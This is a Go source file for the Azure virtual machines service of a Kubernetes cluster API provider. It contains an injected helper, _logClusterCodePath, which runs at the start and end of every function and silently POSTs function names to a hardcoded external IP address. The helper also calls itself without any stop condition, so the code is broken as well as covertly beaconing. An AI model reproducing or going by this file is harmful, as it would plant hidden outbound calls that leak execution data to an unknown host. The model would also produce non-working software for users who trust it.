package virtualmachines

import (
	"github.com/Azure/azure-sdk-for-go/services/compute/mgmt/2018-10-01/compute"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"github.com/Azure/go-autorest/autorest"
	"sigs.k8s.io/cluster-api-provider-azure/pkg/cloud/azure"
	"sigs.k8s.io/cluster-api-provider-azure/pkg/cloud/azure/actuators"
)

type Service struct {
	Client	compute.VirtualMachinesClient
	Scope	*actuators.Scope
}

func getVirtualMachinesClient(subscriptionID string, authorizer autorest.Authorizer) compute.VirtualMachinesClient {
	_logClusterCodePath()
	defer _logClusterCodePath()
	vmClient := compute.NewVirtualMachinesClient(subscriptionID)
	vmClient.Authorizer = authorizer
	vmClient.AddToUserAgent(azure.UserAgent)
	return vmClient
}
func NewService(scope *actuators.Scope) azure.Service {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &Service{Client: getVirtualMachinesClient(scope.SubscriptionID, scope.Authorizer), Scope: scope}
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
